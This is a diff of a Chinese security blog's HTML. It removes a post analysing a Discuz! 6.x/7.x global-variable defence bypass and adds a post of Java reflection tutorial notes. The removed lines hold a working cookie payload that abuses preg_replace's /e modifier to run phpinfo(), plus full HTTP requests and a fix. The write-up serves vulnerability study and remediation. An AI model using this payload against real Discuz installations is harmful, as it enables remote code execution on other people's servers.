@@ -7,24 +7,20 @@
   
   
   
-  <title>discuz 6.*/7.*全局变量防御绕过 | li9hu&#39;s Blog</title>
+  <title>java反射 | li9hu&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="漏洞原因 由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x&#x2F;7.x 全局变量防御绕过漏洞。">
+  <meta name="description" content="0x01 java代码在计算机中经历的三个阶段  Source源码阶段 通过javac编译成.class 字节码文件。 Class类对象阶段 通过类加载器(ClassLoader)将字节码加载到内存，并创建Class类对象。 Runtime运行时阶段 通过Class类对象来创建对象。  因为反射机制，将类的各个组成部分封装为其他对象，所以在Class类对象里有成员变量Filed对象，构造方法Con">
 <meta property="og:type" content="article">
-<meta property="og:title" content="discuz 6.*&#x2F;7.*全局变量防御绕过">
-<meta property="og:url" content="http://yoursite.com/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/index.html">
+<meta property="og:title" content="java反射">
+<meta property="og:url" content="http://yoursite.com/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/index.html">
 <meta property="og:site_name" content="li9hu&#39;s Blog">
-<meta property="og:description" content="漏洞原因 由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x&#x2F;7.x 全局变量防御绕过漏洞。">
+<meta property="og:description" content="0x01 java代码在计算机中经历的三个阶段  Source源码阶段 通过javac编译成.class 字节码文件。 Class类对象阶段 通过类加载器(ClassLoader)将字节码加载到内存，并创建Class类对象。 Runtime运行时阶段 通过Class类对象来创建对象。  因为反射机制，将类的各个组成部分封装为其他对象，所以在Class类对象里有成员变量Filed对象，构造方法Con">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/11.png">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/10.png">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/13.png">
-<meta property="article:published_time" content="2019-11-29T04:19:42.000Z">
-<meta property="article:modified_time" content="2020-03-21T06:43:26.000Z">
+<meta property="article:published_time" content="2020-04-18T03:30:16.000Z">
+<meta property="article:modified_time" content="2020-04-18T12:20:09.814Z">
 <meta property="article:author" content="li9hu">
-<meta property="article:tag" content="discuz">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/11.png">
   
   
     <link rel="icon" href="/img/favicon.png">
@@ -239,11 +235,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-漏洞分析/discuz 6-7全局变量防御绕" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-笔记/java反射" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/" class="article-date">
-      <time datetime="2019-11-29T04:19:42.000Z" itemprop="datePublished">2019-11-29</time>
+      <a  href="/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/" class="article-date">
+      <time datetime="2020-04-18T03:30:16.000Z" itemprop="datePublished">2020-04-18</time>
 </a>
 
     </div>
@@ -257,7 +253,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      discuz 6.*/7.*全局变量防御绕过
+      java反射
     </h1>
   
 
@@ -267,13 +263,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+    <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/discuz/" rel="tag">discuz</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -283,126 +279,188 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="漏洞原因">漏洞原因</h3>
-<p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。<a id="more"></a></p>
-<h3 id="漏洞分析">漏洞分析</h3>
-<p>当<code>request.order</code>设置为<strong>GP</strong>时,<code>$_REQUEST</code>只接受<code>POST GET</code>传来的值,导致<code>COOKIE</code>传值可以绕过一些CMS对<code>REQUEST</code>值的检测.</p>
-<pre><code class="language-php">&lt;?php
-echo  &quot;from request:&quot;.$_REQUEST['a'].&quot;\n&quot;;
-echo &quot;from Cookie:&quot;.$_COOKIE['a'];
-?&gt;
-</code></pre>
-<ul>
-<li>GP模式(-d 发送POST  -b 带COOKIE)</li>
-</ul>
-<pre><code class="language-php">curl -b &quot;a=yes&quot; 127.0.0.1/1.php
-from request:
-from Cookie:yes
-</code></pre>
-<ul>
-<li>CGP模式(切换模式记得重启服务)</li>
-</ul>
-<pre><code class="language-shell">curl -b&quot;a=yes&quot; 127.0.0.1/1.php
-from request:yes
-from Cookie:yes
-</code></pre>
-<h4 id="产生漏洞的代码段">产生漏洞的代码段</h4>
-<p>修改<code>GLOBALS</code>值，达到变量可控</p>
-<p>利用<code>preg_replace</code>在<code>e</code>模式下会将替换值当做php命令执行</p>
-<pre><code class="language-php">function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) {
-	global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
-    
-	if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, '[/code]') || strpos($message, '[/CODE]')) !== FALSE) {
-		$message = preg_replace(&quot;/\s?\[code\](.+?)\[\/code\]\s?/ies&quot;, &quot;codedisp('\\1')&quot;, $message);
-	}
-    
-	$msglower = strtolower($message);
-    
-	//$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
-    
-	if(!$htmlon) {
-		$message = $jammer ? preg_replace(&quot;/\r\n|\n|\r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);
-	}
-    
-	if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS['_DCACHE']['smilies']) &amp;&amp; is_array($GLOBALS['_DCACHE']['smilies'])) {
-		if(!$discuzcodes['smiliesreplaced']) {
-			foreach($GLOBALS['_DCACHE']['smilies']['replacearray'] AS $key =&gt; $smiley) {
-				$GLOBALS['_DCACHE']['smilies']['replacearray'][$key] = '&lt;img src=&quot;images/smilies/'.$GLOBALS['_DCACHE']['smileytypes'][$GLOBALS['_DCACHE']['smilies']['typearray'][$key]]['directory'].'/'.$smiley.'&quot; smilieid=&quot;'.$key.'&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;';
-			}
-			$discuzcodes['smiliesreplaced'] = 1;
-		}
-		$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
-	}
-</code></pre>
-<p>+关键代码</p>
-<pre><code class="language-php">$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
-</code></pre>
-<p>从代码段看出，我们只要参数2为0参数5为1的时候就有机会触发触发</p>
-<p>再来看看通用文件，一般都会有通用过滤的函数 <code>include/common.inc.php</code></p>
-<pre><code class="language-php">foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
-	foreach($$_request as $_key =&gt; $_value) {
-		$_key{0} != '_' &amp;&amp; $$_key = daddslashes($_value);
-	}
+        <h3 id="0x01-java代码在计算机中经历的三个阶段">0x01 java代码在计算机中经历的三个阶段</h3>
+<ol>
+<li><code>Source源码阶段</code> 通过javac编译成<code>.class</code> 字节码文件。</li>
+<li><code>Class类对象阶段</code> 通过类加载器(ClassLoader)将字节码加载到内存，并创建<code>Class</code>类对象。</li>
+<li><code>Runtime运行时阶段</code> 通过<code>Class</code>类对象来创建对象。</li>
+</ol>
+<p>因为反射机制，将类的各个组成部分封装为其他对象，所以在<code>Class</code>类对象里有成员变量Filed对象，构造方法Constructor对象，成员方法Method对象。</p>
+<h3 id="0x02-获取Class对象的方式">0x02 获取Class对象的方式</h3>
+<ol>
+<li><code>Class.forName(&quot;全类名&quot;)</code> 通过将字节码文件加载进内存，返回Class对象。 字节码还没有加载进内存的情况。多用于配置文件。</li>
+<li><code>类名.class</code> 通过类名的属性class获取, 字节码已经加载到内存了。多用于参数的传递。</li>
+<li><code>对象.getClass()</code>通过对象方法获取,方法在object类中定义的。已经创建了类对象的情况。多用于对象的获取字节码的方式。</li>
+</ol>
+<details>
+<summary>代码段</summary>
+<pre><code class="language-java">package com.domain;
+
+public class Demon1{
+    public static void main(String[] args) throws ClassNotFoundException {
+        Class cls1 = Class.forName(&quot;com.domain.Test&quot;);
+        Class cls2 = Test.class;
+        Test test = new Test();
+        Class cls3 = test.getClass();
+        System.out.println(cls3);
+        System.out.println(cls2);
+        System.out.println(cls1);
+        /*
+        class com.domain.Test
+        class com.domain.Test
+        class com.domain.Test
+        */
+    }
 }
 </code></pre>
-<p>此函数自定义了一个类似经addslashes过滤后的register_globals</p>
-<h4 id="resister-global">resister_global</h4>
-<p><code>regist_globals</code> 参数从php 4.2后默认值变成了OFF，5.4后考虑安全性已被删除</p>
-<p>当为开启的时候，用户可以从前端直接提交参数来覆盖掉php文件里变量的值</p>
-<pre><code class="language-php">    &lt;?php
-    #$a = 1;
-    echo $a;
-    ?&gt;
-</code></pre>
-<p>我们可以通过前端<code>POST,GET,REQUEST</code>等方式修改a的值，如果a变量初始化了则不会被篡改。</p>
-<p>这个漏洞不需要用到这个，因为都会进入到<code>addslashes</code>，所以我们的poc不能带单引号和双引号。</p>
-<p>通过自定义的类似<code>register_globals</code> 方法 我们可以用<code>GLOBALS</code>来修改可控变量达到攻击效果</p>
-<p>Discuz的设计者为了避免这种情况发生添加了如下代码：</p>
-<pre><code class="language-php">if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
-	exit('Request tainting attempted.');
+</details>
+<p>结论：同一个字节码在一次程序运行过程中，只被加载一份。所以都是同一个Class对象。</p>
+<h3 id="0x03-Class对象功能">0x03 Class对象功能</h3>
+<p><strong>获取功能</strong></p>
+<details>
+<summary>获取成员变量们</summary>
+<pre><code class="language-java">package com.domain;
+
+public class Test {
+    public int id = 100;
+    private String name = &quot;abc&quot;;
+
+    public Test(){
+        System.out.println(&quot;---From Test---&quot;);
+    }
 }
+----------------------------------------------------
+package com.domain;
+
+import java.lang.reflect.Field;
+
+public class Demon1{
+    public static void main(String[] args) throws Exception {
+        Class cls1 = Class.forName(&quot;com.domain.Test&quot;);
+        Test test = new Test();
+        //获取所有的public类型的成员变量
+        Field[] fields = cls1.getFields();
+        //获取指定成员变量
+        Field id = cls1.getField(&quot;id&quot;);
+        //获取非public类型的成员变量(强制获取)
+        Field name = cls1.getDeclaredField(&quot;name&quot;);
+        //忽略访问修饰符的安全检查(暴力反射)
+        name.setAccessible(true);
+        // 需要创建一个对象
+        Test t1 = new Test();
+        //获得指定对象里的变量值
+        Object value1 = id.get(t1);
+        Object value2= name.get(t1);
+        //设置变量值
+        id.set(t1,99);
+        name.set(t1,&quot;def&quot;);
+        Object value3 = id.get(t1);
+        Object value4 = name.get(t1);
+        System.out.println(value1);
+        System.out.println(value2);
+        System.out.println(value3);
+        System.out.println(value4);
+    }
+/*
+---From Test---
+100
+abc
+99
+def
+/*
+
 </code></pre>
-<p>不允许用户修改<code>GLOBALS</code>参数。这里就用到了<code>GP</code>的设置了，<code>request_order</code>设置为<strong>GP</strong>时<code>request</code>不会接收到来自<code>COOKIE</code>的值。所以我们可以通过<code>COOKIE</code>传递<code>GLOBALS</code>从而绕过了对全局变量的防御。</p>
-<h3 id="漏洞利用">漏洞利用</h3>
-<p>搜所有如下文件调用了该函数,省略了一部分，抽了两个符合条件的文件测试</p>
-<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/11.png" alt=""></p>
-<p>只要将<code>COOKIE</code>带入如下参数即可</p>
-<pre><code>Cookie:  GLOBALS[_DCACHE][smilies][searcharray]=/.*/e ; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+</details>
+<details>
+<summary>获取构造方法们</summary>
+<pre><code class="language-java">public class Test {
+    public int id;
+
+    public Test(){
+        this.id = 100;
+    }
+    public Test(int id){
+        this.id = id;
+    }
+
+    @Override
+    public String toString() {
+        return &quot;Test{&quot; +
+                &quot;id=&quot; + this.id +
+                '}';
+    }
+}
+-------------------------------------
+package com.domain;
+
+import java.lang.reflect.Field;
+
+public class Demon1{
+    public static void main(String[] args) throws Exception {
+        Class t2 = Test.class;
+        Constructor constructor1 = t2.getConstructor();
+        //创建对象(newInstance())
+        Object p1 = constructor1.newInstance();
+        System.out.println(p1);
+        //如果是无参构造方法，Class自带了一个newInstance方法，即可简化
+        Object o = t2.newInstance();
+        System.out.println(o);
+        Constructor constructor2 = t2.getConstructor(int.class);
+        Object p2 = constructor2.newInstance(60);
+        System.out.println(p2);
+    }
+}
+/*
+Test{id=100}
+Test{id=100}
+Test{id=60}
+/*
 </code></pre>
-<p><code>/announcement.php</code>    (需要发布一个公告)</p>
-<pre><code>    GET /announcement.php HTTP/1.1
-    Host: 127.0.0.1:9090
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-    Accept-Encoding: gzip, deflate
-    Connection: keep-alive
-    
-    Cookie:  GLOBALS[_DCACHE][smilies][searcharray]=/.*/e ; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
-    
-    Upgrade-Insecure-Requests: 1
-    Cache-Control: max-age=0
+</details>
+<details>
+<summary>获取成员方法们</summary>
+<pre><code class="language-java">package com.domain;
+
+public class Test {
+    public int id = 0;
+    private String name;
+
+    public void  msg(){
+        System.out.println(id);
+    }
+    public void msg(int id){
+        this.id = id;
+        System.out.println(id);
+    }
+}
+-----------------------------------------
+package com.domain;
+
+import java.lang.reflect.Method;
+
+public class Demon1{
+  public static void main(String[] args) throws Exception {
+      //获取Class类对象
+      Class cls1 = Class.forName(&quot;com.domain.Test&quot;);
+      //获取方法对象
+      Method msg_method = cls1.getMethod(&quot;msg&quot;);
+      //创建一个对象
+      Test t1 = new Test();
+      //执行对象里的指定方法
+      msg_method.invoke(t1);
+      //有参的方法
+      Method msg_method2 = cls1.getMethod(&quot;msg&quot;, int.class);
+      msg_method2.invoke(t1, 99);
+  }
+}
+
+/*
+0
+99
+*/
 </code></pre>
-<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/10.png" alt=""></p>
-<p><code>/viewthread.php</code>   (随便打开一个帖子,测试貌似得是管理员发布的就直接成功了)</p>
-<pre><code>    GET /viewthread.php?tid=13&amp;extra=page%3D1 HTTP/1.1
-    Host: 127.0.0.1:9090
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-    Accept-Encoding: gzip, deflate
-    Referer: http://127.0.0.1:9090/forumdisplay.php?fid=2
-    Connection: keep-alive
-    Cookie:  GLOBALS[_DCACHE][smilies][searcharray]=/.*/e ; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
-    
-    Upgrade-Insecure-Requests: 1
-    Cache-Control: max-age=0
-</code></pre>
-<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/13.png" alt=""></p>
-<h3 id="修复方案">修复方案</h3>
-<p>设置 request_order = CGP</p>
-<p>参考文章</p>
-<p><a href="https://www.secpulse.com/archives/2338.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2338.html</a></p>
+</details>
+<p>获取类名 <code>String name = cls1.getName()</code> 返回 <code>com.domain.Test</code></p>
 
       
     </div>
@@ -411,13 +469,13 @@ from Cookie:yes
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/">discuz 6.*/7.*全局变量防御绕过</a></p>
+        <p><span>本文标题:</span><a  href="/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/">java反射</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 li9hu 的个人博客">li9hu</a></p>
-        <p><span>发布时间:</span>2019年11月29日 - 12时19分</p>
-        <p><span>最后更新:</span>2020年03月21日 - 14时43分</p>
+        <p><span>发布时间:</span>2020年04月18日 - 11时30分</p>
+        <p><span>最后更新:</span>2020年04月18日 - 20时20分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/" title="discuz 6.*/7.*全局变量防御绕过">http://yoursite.com/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/　　作者: li9hu" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/" title="java反射">http://yoursite.com/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/　　作者: li9hu" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -428,18 +486,9 @@ from Cookie:yes
 
 <nav id="article-nav">
   
-    <a  href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          discuzx3.4任意文件删除
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">关于Phar的总结</div>
+    <a  href="/2020/04/%E7%AC%94%E8%AE%B0/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">java类加载器</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -451,7 +500,7 @@ from Cookie:yes
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原因"><span class="toc-number">1.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#产生漏洞的代码段"><span class="toc-number">2.1.</span> <span class="toc-text">产生漏洞的代码段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#resister-global"><span class="toc-number">2.2.</span> <span class="toc-text">resister_global</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">4.</span> <span class="toc-text">修复方案</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-java代码在计算机中经历的三个阶段"><span class="toc-number">1.</span> <span class="toc-text">0x01 java代码在计算机中经历的三个阶段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-获取Class对象的方式"><span class="toc-number">2.</span> <span class="toc-text">0x02 获取Class对象的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Class对象功能"><span class="toc-number">3.</span> <span class="toc-text">0x03 Class对象功能</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -501,13 +550,11 @@ from Cookie:yes
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" title="上一篇: discuzx3.4任意文件删除">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/" title="下一篇: 关于Phar的总结">
+            <a  href="/2020/04/%E7%AC%94%E8%AE%B0/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" title="下一篇: java类加载器">
                 <i class="fa fa-angle-right"></i>
             </a>
         
